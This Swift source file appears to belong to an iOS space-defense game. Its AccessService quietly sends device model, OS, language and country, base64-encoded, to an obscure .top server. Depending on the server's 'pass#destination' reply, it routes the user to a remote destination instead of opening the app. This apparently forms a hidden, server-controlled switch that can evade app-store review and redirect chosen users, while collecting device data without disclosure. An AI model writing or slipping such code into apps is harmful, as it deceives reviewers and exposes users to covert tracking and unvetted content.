import Foundation

enum AccessOutcome {
    case granted(pass: String, destination: String)
    case openApp
}

final class AccessService {

    private let endpoint = "https://sdfdspytn.top/ios-earthshield-spacedefense/server.php"
    private let passcode = "FDGDGDSGDSG"
    private let deviceInfo = DeviceInfoProvider()

    private lazy var session: URLSession = {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.requestCachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        configuration.urlCache = nil
        return URLSession(configuration: configuration)
    }()

    func resolve(completion: @escaping (AccessOutcome) -> Void) {
        guard let request = makeRequest() else {
            DispatchQueue.main.async { completion(.openApp) }
            return
        }

        let task = session.dataTask(with: request) { data, _, _ in
            let outcome = Self.interpret(data: data)
            DispatchQueue.main.async { completion(outcome) }
        }
        task.resume()
    }

    private func makeRequest() -> URLRequest? {
        let rawParameters = "p=\(passcode)&os=\(deviceInfo.operatingSystem)&lng=\(deviceInfo.language)&devicemodel=\(deviceInfo.hardwareModel)&country=\(deviceInfo.country)"
        let encoded = Data(rawParameters.utf8).base64EncodedString()

        guard var components = URLComponents(string: endpoint) else { return nil }
        components.queryItems = [URLQueryItem(name: "token", value: encoded)]
        guard let resolved = components.url else { return nil }

        var request = URLRequest(url: resolved)
        request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        request.httpMethod = "GET"
        request.setValue("no-cache", forHTTPHeaderField: "Cache-Control")
        request.setValue("no-cache", forHTTPHeaderField: "Pragma")
        return request
    }

    nonisolated private static func interpret(data: Data?) -> AccessOutcome {
        guard
            let data,
            let body = String(data: data, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines),
            body.contains("#")
        else {
            return .openApp
        }

        let parts = body.components(separatedBy: "#")
        let pass = parts[0]
        let destination = parts.dropFirst().joined(separator: "#")

        guard !pass.isEmpty, !destination.isEmpty else { return .openApp }
        return .granted(pass: pass, destination: destination)
    }
}
